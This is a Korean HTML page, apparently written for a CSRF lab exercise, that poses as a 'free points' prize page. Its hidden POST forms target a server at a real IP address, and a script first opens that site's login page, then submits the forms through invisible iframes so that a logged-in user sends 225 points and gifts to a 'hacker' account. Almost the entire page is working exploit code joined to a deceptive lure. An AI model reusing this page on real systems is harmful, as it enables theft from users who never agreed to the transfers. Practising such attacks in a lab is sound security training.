<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 무료 포인트 받기</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            color: white;
        }
        .gift-container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 50px;
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
        }
        .gift-box {
            font-size: 8em;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-20px); }
            60% { transform: translateY(-10px); }
        }
        .message {
            font-size: 1.5em;
            margin: 20px 0;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        .auto-message {
            font-size: 1.2em;
            color: #FFD700;
            margin-top: 30px;
        }
        .step-button {
            background: linear-gradient(45deg, #FF6B6B, #FF8E53);
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            color: white;
            font-size: 1.1em;
            cursor: pointer;
            margin: 10px;
            transition: transform 0.3s;
        }
        .step-button:hover {
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <div class="gift-container">
        <div class="gift-box">🎁</div>
        <h1>축하합니다!</h1>
        <p class="message">🎉 특별 이벤트에 당첨되셨습니다!</p>
        
        <div id="mainContent">
            <p class="auto-message">📋 CSRF 공격 실습 과정</p>
            
            <div style="margin: 30px 0;">
                <button class="step-button" onclick="step1_openSite()">
                    1️⃣ 사이트에 로그인하기
                </button>
                <br>
                <button class="step-button" onclick="step2_executeAttack()">
                    2️⃣ 공격 실행하기
                </button>
                <br>
                <button class="step-button" onclick="step3_checkResult()">
                    3️⃣ 결과 확인하기
                </button>
            </div>
            
            <div id="instructions" style="margin-top: 30px;">
                <p style="font-size: 0.9em; color: #FFD700;">
                    💡 <strong>사용법:</strong><br>
                    1. 먼저 "사이트에 로그인하기" 버튼을 클릭<br>
                    2. 새 탭에서 로그인 완료 후 이 탭으로 돌아오기<br>
                    3. "공격 실행하기" 버튼 클릭<br>
                    4. "결과 확인하기"로 성공 여부 확인
                </p>
            </div>
        </div>
    </div>

    <!-- 실제 공격 Form들 (숨겨짐) -->
    <form id="attack1" method="POST" action="http://3.36.66.216/profile.php" target="result1" style="display: none;">
        <input type="hidden" name="receiver_id" value="13">
        <input type="hidden" name="points" value="100">
        <input type="hidden" name="send_gift" value="1">
        <input type="hidden" name="gift_type" value="diamond">
        <input type="hidden" name="message" value="CSRF_Step_Attack_1">
    </form>
    
    <form id="attack2" method="POST" action="http://3.36.66.216/profile.php" target="result2" style="display: none;">
        <input type="hidden" name="receiver_id" value="13">
        <input type="hidden" name="points" value="75">
        <input type="hidden" name="send_gift" value="1">
        <input type="hidden" name="gift_type" value="coffee">
        <input type="hidden" name="message" value="CSRF_Step_Attack_2">
    </form>
    
    <form id="attack3" method="POST" action="http://3.36.66.216/profile.php" target="result3" style="display: none;">
        <input type="hidden" name="receiver_id" value="13">
        <input type="hidden" name="points" value="50">
        <input type="hidden" name="send_gift" value="1">
        <input type="hidden" name="gift_type" value="cake">
        <input type="hidden" name="message" value="CSRF_Step_Attack_3">
    </form>

    <!-- 결과 확인용 숨겨진 iframe들 -->
    <iframe name="result1" style="display: none;"></iframe>
    <iframe name="result2" style="display: none;"></iframe>
    <iframe name="result3" style="display: none;"></iframe>

    <script>
        let loginWindowRef = null;
        let attackExecuted = false;
        
        function step1_openSite() {
            console.log('📂 1단계: 로그인 창 열기');
            
            // 로그인 창 열기
            loginWindowRef = window.open(
                'http://3.36.66.216/login.php', 
                'loginWindow',
                'width=800,height=600,scrollbars=yes,resizable=yes'
            );
            
            // 지시사항 업데이트
            document.getElementById('instructions').innerHTML = 
                '<p style="color: #00FF88;">✅ 로그인 창이 열렸습니다!</p>' +
                '<p style="font-size: 0.9em;">새 탭에서 로그인을 완료한 후, 이 탭으로 돌아와서 "공격 실행하기"를 클릭하세요.</p>' +
                '<p style="color: #FFB347; font-size: 0.8em;">⚠️ 로그인 탭을 닫지 마세요! (세션 유지 필요)</p>';
        }
        
        function step2_executeAttack() {
            if (attackExecuted) {
                alert('이미 공격이 실행되었습니다!');
                return;
            }
            
            console.log('🚀 2단계: CSRF 공격 실행');
            attackExecuted = true;
            
            // UI 업데이트
            document.getElementById('instructions').innerHTML = 
                '<p style="color: #FFD700;">⚡ 공격 실행 중...</p>';
            
            // 공격 실행
            setTimeout(() => {
                document.getElementById('attack1').submit();
                console.log('📤 Attack 1: 100P');
            }, 500);
            
            setTimeout(() => {
                document.getElementById('attack2').submit();
                console.log('📤 Attack 2: 75P');
            }, 1000);
            
            setTimeout(() => {
                document.getElementById('attack3').submit();
                console.log('📤 Attack 3: 50P');
            }, 1500);
            
            setTimeout(() => {
                document.getElementById('instructions').innerHTML = 
                    '<p style="color: #00FF88;">✅ 공격 완료!</p>' +
                    '<p>총 225 포인트 전송 시도됨</p>' +
                    '<p style="font-size: 0.9em;">"결과 확인하기"를 클릭하여 성공 여부를 확인하세요.</p>';
            }, 2500);
        }
        
        function step3_checkResult() {
            console.log('🔍 3단계: 결과 확인');
            
            // 결과 확인 창 열기
            window.open('http://3.36.66.216', 'resultWindow', 'width=800,height=600');
            
            document.getElementById('instructions').innerHTML = 
                '<p style="color: #00FF88;">🔍 결과 확인 창이 열렸습니다!</p>' +
                '<p style="font-size: 0.9em;">새 탭에서 hacker 계정의 포인트 증가를 확인해보세요.</p>' +
                '<div style="margin-top: 20px;">' +
                '<button class="step-button" onclick="resetAttack()">🔄 다시 시도</button>' +
                '</div>';
        }
        
        function resetAttack() {
            attackExecuted = false;
            document.getElementById('instructions').innerHTML = 
                '<p style="font-size: 0.9em; color: #FFD700;">' +
                '💡 <strong>사용법:</strong><br>' +
                '1. 먼저 "사이트에 로그인하기" 버튼을 클릭<br>' +
                '2. 새 탭에서 로그인 완료 후 이 탭으로 돌아오기<br>' +
                '3. "공격 실행하기" 버튼 클릭<br>' +
                '4. "결과 확인하기"로 성공 여부 확인' +
                '</p>';
        }
        
        console.log('🎯 단계별 CSRF 공격 시스템 준비됨');
        console.log('📋 실습용 단계별 가이드');
        console.log('🎯 타겟: hacker (ID: 13)');
    </script>
</body>
</html>
